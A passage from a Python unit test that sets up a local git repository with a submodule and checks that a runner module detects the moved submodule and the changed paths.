            root.mkdir()
            git(root, 'init', '-q', '-b', 'main')
            (root / 'README').write_text('x\n')
            git(root, 'submodule', 'add', '-q', str(sub), 'web')
            git(root, 'add', '.')
            git(root, 'commit', '-q', '-m', 'root')
            git(root, 'tag', 'base')
            (root / 'web/bun.lock').write_text('new\n')
            git(root / 'web', 'commit', '-q', '-am', 'bump')
            (root / 'toolchain-manifest.yaml').write_text('bun: "1"\n')
            git(root, 'add', '.')
            git(root, 'commit', '-q', '-m', 'gitlink')
            self.assertEqual(runner.moved_submodules(root, 'base').keys(), {'web'})
            self.assertEqual(runner.changed_paths(root, 'base'), ['toolchain-manifest.yaml', 'web/bun.lock'])


if __name__ == '__main__':
    unittest.main()
